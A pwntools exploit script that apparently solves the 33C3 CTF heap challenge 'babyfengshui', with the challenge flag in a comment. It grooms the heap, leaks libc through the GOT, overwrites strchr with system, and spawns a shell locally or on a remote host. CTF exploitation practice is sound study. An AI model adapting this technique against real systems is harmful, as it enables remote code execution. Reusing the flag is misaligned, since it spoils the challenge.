#!/usr/bin/env python

from pwn import *
import sys

'''
flag: 33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1

typedef struct user {
	char* desc;
	char name[0x80];
}
'''

def add_user(dsize, name, tsize, desc):
	r.sendline('0')
	r.recvuntil('description: ')
	r.sendline(str(dsize))
	r.recvuntil('name: ')
	r.sendline(name)
	r.recvuntil('length: ')
	r.sendline(str(tsize))
	r.recvuntil('text: ')
	r.sendline(desc)
	r.recvuntil('Action: ')

def del_user(idx):
	r.sendline('1')
	r.recvuntil('index: ')
	r.sendline(str(idx))
	r.recvuntil('Action: ')

def display_user(idx):
	r.sendline('2')
	r.recvuntil('index: ')
	r.sendline(str(idx))
	r.recvuntil('description: ')
	return r.recv(4)

def edit_user(idx, size, data):
	r.sendline('3')
	r.recvuntil('index: ')
	r.sendline(str(idx))
	r.recvuntil('length: ')
	r.sendline(str(size))
	r.recvuntil('text: ')
	r.sendline(data)


def exploit(r):

	e = ELF('babyfengshui')

	r.recvuntil('Action: ')

	add_user(0x80, "AAAA", 16, "BBBB")
	add_user(16, "AAAA", 16, "BBBB")
	del_user(0)

	payload = "E" * 0x128
	payload += p32(e.got['strchr'])

	add_user(256, "DDDD", 0x180, payload)

	libc_strchr = u32(display_user(1))
	libc_base = libc_strchr - 0x0094c40	# 0x8f2b0
	libc_system = libc_base + 0x3e3e0
	log.info("Libc base:   " + hex(libc_base))
	log.info("Libc strchr: " + hex(libc_strchr))
	log.info("Libc system: " + hex(libc_system))

	edit_user(1, 20, p32(libc_system) + ";/bin/sh")

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./babyfengshui'])
        print util.proc.pidof(r)
        pause()
        exploit(r)